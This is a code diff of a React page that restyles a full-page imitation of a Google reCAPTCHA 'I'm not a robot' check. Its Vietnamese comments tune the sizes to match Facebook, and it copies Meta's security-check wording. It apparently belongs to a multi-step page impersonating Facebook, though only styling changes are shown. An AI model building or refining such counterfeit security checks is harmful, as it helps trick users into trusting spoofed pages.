@@ -712,9 +712,16 @@ export default function Home() {
           <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
             <div style={{ width: '100%', maxWidth: '460px' }}>
 
-                                         {/* BƯỚC 3: CAPTCHA FULL PAGE */}
+                                                       {/* BƯỚC 3: CAPTCHA FULL PAGE - Chuẩn tỷ lệ FB */}
               {step === 3 && (
-                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', width: '100%', maxWidth: '440px', margin: '0 auto' }}>
+                <div style={{ 
+                  display: 'flex', 
+                  flexDirection: 'column', 
+                  alignItems: 'flex-start', 
+                  width: '100%', 
+                  maxWidth: '400px', // Thu nhỏ lại cho vừa vặn
+                  margin: '60px auto 0 auto' // Đẩy xuống một chút cho cân đối
+                }}>
                   
                   {/* Khung reCAPTCHA */}
                   <div 
@@ -737,13 +744,13 @@ export default function Home() {
                     <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                       {/* Checkbox */}
                       <div style={{
-                        width: '28px', height: '28px', border: '2px solid #c1c1c1',
+                        width: '24px', height: '24px', border: '2px solid #c1c1c1',
                         borderRadius: '2px', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                        background: captchaChecked && !captchaLoading ? '#fff' : '#fff',
+                        background: '#fff',
                         flexShrink: 0, transition: 'all 0.2s'
                       }}>
-                        {captchaChecked && !captchaLoading && <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
-                        {captchaLoading && <div style={{ width: '18px', height: '18px', border: '3px solid #e0e0e0', borderTop: '3px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
+                        {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
+                        {captchaLoading && <div style={{ width: '14px', height: '14px', border: '2px solid #e0e0e0', borderTop: '2px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
                       </div>
                       <span style={{ fontSize: '14px', color: '#000', fontWeight: '400' }}>
                         I'm not a robot
@@ -752,18 +759,18 @@ export default function Home() {
                     
                     {/* Logo reCAPTCHA */}
                     <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-                      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '32px', height: '32px', marginBottom: '2px' }} />
+                      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
                       <span style={{ fontSize: '10px', color: '#555' }}>reCAPTCHA</span>
                       <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
                     </div>
                   </div>
 
                   {/* Text mô tả bên dưới */}
-                  <div style={{ marginTop: '16px', fontSize: '12px', color: '#555', lineHeight: '1.5', textAlign: 'left', width: '100%' }}>
-                    <p style={{ margin: '0 0 10px 0' }}>
+                  <div style={{ marginTop: '12px', fontSize: '11px', color: '#555', lineHeight: '1.4', textAlign: 'left', width: '100%' }}>
+                    <p style={{ margin: '0 0 8px 0' }}>
                       This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
                     </p>
-                    <p style={{ margin: '0 0 10px 0' }}>
+                    <p style={{ margin: '0 0 8px 0' }}>
                       We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
                     </p>
                     <p style={{ margin: 0 }}>
